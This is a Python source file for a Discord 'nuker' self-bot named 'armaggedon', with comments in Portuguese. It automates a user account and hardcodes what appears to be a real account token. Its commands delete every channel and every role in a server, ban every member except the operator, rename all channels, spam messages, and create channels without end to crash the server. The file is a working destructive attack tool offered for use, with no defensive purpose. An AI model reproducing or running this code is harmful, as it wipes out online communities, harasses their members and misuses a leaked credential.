import discord
from discord.ext import commands
import os
from colorama import Fore, Style
import asyncio

# Print inicial: "armaggedon" em vermelho sangrento
os.system("cls" if os.name == "nt" else "clear")
print(Fore.RED + Style.BRIGHT)
print("=" * 40)
print("               armaggedon")
print("=" * 40 + Style.RESET_ALL)

TOKEN = "MTM3MTUyOTc1MDAyMzExMDg0OQ.GZxntS.3uVVt2qdchFWq-7qz9YrYETPEPXf72zv-nXnV8"  # <-- Troque aqui pelo seu token

bot = commands.Bot(command_prefix='.', self_bot=True)

@bot.event
async def on_ready():
    print(f"✅ Logado como {bot.user}!")

@bot.command(name='del')
async def delete_channels(ctx):
    if not ctx.guild:
        await ctx.send("❌ Esse comando só pode ser usado em servidores.")
        return

    tasks = [channel.delete() for channel in ctx.guild.channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    sucesso = 0
    falha = 0
    for i, result in enumerate(results):
        # Cuidado: canais podem sumir na execução, por isso pegar nome antes
        channel_name = getattr(ctx.guild.channels[i], "name", f"Canal #{i+1}")
        if isinstance(result, Exception):
            falha += 1
            print(f"[X] Falha ao deletar {channel_name}: {result}")
        else:
            sucesso += 1
            print(f"[✓] Canal deletado: {channel_name}")

    try:
        await ctx.send(f"💣 Deletados {sucesso} canais, falhas: {falha}.")
    except:
        pass

@bot.command(name='criar99')
async def criar_99_canais(ctx):
    if not ctx.guild:
        await ctx.send("❌ Esse comando só pode ser usado em servidores.")
        return

    nome_canal = "armaggedon"
    tasks = []
    for _ in range(99):
        tasks.append(ctx.guild.create_text_channel(nome_canal))

    results = await asyncio.gather(*tasks, return_exceptions=True)

    sucesso = 0
    falha = 0
    for result in results:
        if isinstance(result, Exception):
            falha += 1
            print(f"[X] Falha ao criar canal: {result}")
        else:
            sucesso += 1
            print(f"[✓] Canal criado: {nome_canal}")

    await ctx.send(f"✅ Criação finalizada: {sucesso} canais criados, {falha} falhas.")

@bot.command(name='spam')
async def spam(ctx, *, texto=None):
    if not texto:
        await ctx.send("⚠️ Use `.spam texto_aqui` para enviar spam.")
        return

    for _ in range(10):
        try:
            await ctx.send(texto)
            await asyncio.sleep(1)
        except Exception as e:
            print(f"[X] Falha ao enviar spam: {e}")

@bot.command(name='rename')
async def rename_channels(ctx, *, novo_nome=None):
    if not ctx.guild:
        await ctx.send("❌ Esse comando só pode ser usado em servidores.")
        return

    if not novo_nome:
        await ctx.send("⚠️ Use `.rename novo_nome` para renomear os canais.")
        return

    for channel in ctx.guild.channels:
        try:
            await channel.edit(name=novo_nome)
            print(f"[✓] Canal renomeado para: {novo_nome}")
        except Exception as e:
            print(f"[X] Falha ao renomear canal {channel.name}: {e}")

    await ctx.send(f"✅ Todos os canais foram renomeados para '{novo_nome}'.")

@bot.command(name='banall')
async def ban_all(ctx):
    if not ctx.guild:
        await ctx.send("❌ Esse comando só pode ser usado em servidores.")
        return

    members_to_ban = [member for member in ctx.guild.members if member != ctx.author]

    tasks = [member.ban(reason="Banido pelo bot") for member in members_to_ban]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    banned = 0
    failed = 0
    for member, result in zip(members_to_ban, results):
        if isinstance(result, Exception):
            failed += 1
            print(f"[X] Falha ao banir {member}: {result}")
        else:
            banned += 1
            print(f"[✓] Membro banido: {member}")

    await ctx.send(f"✅ Banimento finalizado: {banned} banidos, {failed} falhas.")

@bot.command(name='crash')
async def crash(ctx):
    if not ctx.guild:
        await ctx.send("❌ Esse comando só pode ser usado em servidores.")
        return

    await ctx.send("⚠️ Iniciando crash: criação infinita de canais (use Ctrl+C para parar).")

    count = 0
    while True:
        try:
            await ctx.guild.create_text_channel(f"crash-{count}")
            count += 1
            print(f"[✓] Canal criado: crash-{count}")
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"[X] Erro ao criar canal: {e}")
            await asyncio.sleep(5)

# NOVO COMANDO: deletar todos os cargos (menos @everyone) rapidamente
@bot.command(name='delroles')
async def delete_roles(ctx):
    if not ctx.guild:
        await ctx.send("❌ Esse comando só pode ser usado em servidores.")
        return

    roles = ctx.guild.roles
    roles_to_delete = [role for role in roles if role.name != "@everyone"]

    # Criar tarefas para deletar em paralelo
    tasks = [role.delete(reason="Deletado pelo comando delroles") for role in roles_to_delete]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    sucesso = 0
    falha = 0
    for role, result in zip(roles_to_delete, results):
        if isinstance(result, Exception):
            falha += 1
            print(f"[X] Falha ao deletar cargo {role.name}: {result}")
        else:
            sucesso += 1
            print(f"[✓] Cargo deletado: {role.name}")

    await ctx.send(f"✅ Deletados {sucesso} cargos, falhas: {falha}.")

bot.run(TOKEN)
